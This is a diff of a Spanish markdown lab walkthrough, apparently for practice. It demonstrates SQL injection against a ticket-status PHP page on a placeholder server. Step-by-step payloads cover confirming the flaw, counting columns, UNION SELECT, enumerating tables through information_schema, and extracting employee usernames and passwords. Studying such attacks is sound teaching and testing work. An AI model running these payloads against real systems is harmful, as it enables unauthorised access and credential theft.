@@ -19,7 +19,7 @@ vamos a:
 
 ---
 
-## 🟢 1. Punto de partida
+### 1. Punto de partida
 
 Usamos un ticket válido, para ello creamos un ticket y usamos el codigo que nos proporciona:
 
@@ -33,9 +33,8 @@ URL base:
 http://<IP_SERVIDOR>:8080/estado_ticket.php?codigo=TCK-2026-001
 ```
 
----
 
-## 🔎 2. Confirmar SQL Injection
+### 2. Confirmar SQL Injection
 
 ```text
 TCK-2026-001'
@@ -43,9 +42,8 @@ TCK-2026-001'
 
 Si hay error o comportamiento distinto → posible SQLi.
 
----
 
-## 🔥 3. Confirmación real
+### 3. Confirmación real
 
 ```text
 ' OR '1'='1'#
@@ -53,9 +51,9 @@ Si hay error o comportamiento distinto → posible SQLi.
 
 Si muestra varios tickets → SQLi confirmada.
 
----
 
-## 🧠 4. Número de columnas (IMPORTANTE)
+
+### 4. Número de columnas (IMPORTANTE)
 
 Probamos:
 
@@ -75,25 +73,22 @@ Resultado:
 
 La consulta tiene 6 columnas.
 
----
 
-## 💣 5. Preparar UNION SELECT
+### 5. Preparar UNION SELECT
 
 ```text
 ' UNION SELECT 'A','B','C','D','E','F'#
 ```
 
----
 
-## 🟣 6. Obtener nombre de la base de datos
+### 6. Obtener nombre de la base de datos
 
 ```text
 ' UNION SELECT database(),'B','C','D','E','F'#
 ```
 
----
 
-## 🟠 7. Listar tablas
+### 7. Listar tablas
 
 ```text
 ' UNION SELECT group_concat(table_name),'B','C','D','E','F'
@@ -101,9 +96,8 @@ FROM information_schema.tables
 WHERE table_schema = database()#
 ```
 
----
 
-## 🟡 8. Listar columnas de la tabla tickets
+### 8. Listar columnas de la tabla tickets
 
 ```text
 ' UNION SELECT group_concat(column_name separator ' | '),'B','C','D','E','F'
@@ -111,9 +105,7 @@ FROM information_schema.columns
 WHERE table_name = 'tickets'#
 ```
 
----
-
-## 🔵 9. Listar columnas de empleados
+### 9. Listar columnas de empleados
 
 ```text
 ' UNION SELECT group_concat(column_name separator ' | '),'B','C','D','E','F'
@@ -121,18 +113,14 @@ FROM information_schema.columns
 WHERE table_name = 'empleados'#
 ```
 
----
-
-## 🔴 10. Extraer usuarios
+### 10. Extraer usuarios
 
 ```text
 ' UNION SELECT group_concat(username separator ' | '),'B','C','D','E','F'
 FROM empleados#
 ```
 
----
-
-## 💥 11. Extraer credenciales
+### 11. Extraer credenciales
 
 ```text
 ' UNION SELECT group_concat(username,':',password separator ' | '),'B','C','D','E','F'
@@ -141,7 +129,7 @@ FROM empleados#
 
 ---
 
-## 🧠 Puntos clave del aprendizaje
+## 🧠 Puntos clave 
 
 - SQLi en endpoint público.
 - Uso de ORDER BY.
@@ -150,21 +138,7 @@ FROM empleados#
 - Uso de `information_schema`.
 - Uso de `group_concat`.
 
----
 
-## 🏁 Resumen final
-
-1. Detectar SQLi.
-2. Contar columnas.
-3. Usar UNION.
-4. Enumerar base de datos.
-5. Extraer datos.
-
----
-
-# 📸 Evidencias gráficas
-
-## Figura 1. Extracción de credenciales mediante SQL Injection
 
 <p align="center">
   <img src="./img/leak-databas-tickets.png" width="850">
